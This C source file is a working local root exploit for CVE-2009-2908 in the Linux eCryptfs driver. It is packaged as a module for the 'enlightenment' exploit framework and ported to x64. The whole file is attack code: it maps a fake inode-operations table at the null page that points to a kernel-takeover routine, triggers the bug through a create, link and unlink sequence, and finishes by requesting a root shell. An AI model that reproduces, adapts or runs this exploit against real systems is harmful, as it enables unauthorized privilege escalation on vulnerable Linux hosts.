/* CVE-2009-2908
   Integrated into enlightenment upon Fotis Loukos' request
   Also ported to x64
   Original x86 exploit was written by Fotis Loukos:
   http://fotis.loukos.me/security/exploits/paokara.c
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#define __USE_GNU
#include <fcntl.h>
#include <sys/types.h>
#include "exp_framework.h"

struct exploit_state *exp_state;

struct myinodeops {
	void *dontcare[17];
	void *getxattr;
};

char *desc = "Paokara: Linux 2.6.19->2.6.31.1 eCryptfs local root";
char *cve = "CVE-2009-2908";

int prepare(unsigned char *buf)
{
	/* this gets placed at 0x1 because we overwrite the i_op with 0x1
	   in our loop that sets the mutex count properly
	*/
	struct myinodeops *ops = (struct myinodeops *)(buf + 1);
	unsigned long *lbuf = (unsigned long *)buf;
	int i;

	/* make sure mutex count is 1, handle any configuration
	*/
	for (i = 0; i < 200; i++)
		lbuf[i] = 1;
		
	ops->getxattr = exp_state->own_the_kernel;

	return 0;
}

int requires_null_page = 1;

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int trigger(void)
{
	char buf1[4096];
	char buf2[4096];
	int fd;
	char *path = getenv("XPL_PATH");
	if (path == NULL) {
		fprintf(stdout, " [+] XPL_PATH environment variable not set.  Defaulting to current directory.\n");
		path = ".";
	}
	snprintf(buf1, sizeof(buf1), "%s/lala", path);
	snprintf(buf2, sizeof(buf2), "%s/koko", path);

	if (open(buf1, O_RDWR | O_CREAT | O_EXCL | O_NOFOLLOW, 0600) < 0) {
		fprintf(stdout, "Failed to create %s\n", buf1);
		return 0;
	}
	link(buf1, buf2);
	unlink(buf1);
	if ((fd = open(buf2, O_RDWR | O_CREAT | O_NOFOLLOW, 0600)) < 0) {
		fprintf(stdout, "Failed to create %s\n", buf2);
		return 0;
	}
	unlink(buf2);
	write(fd, "kot!", 4);

	return 1;
}

int post(void)
{
	return RUN_ROOTSHELL;
}
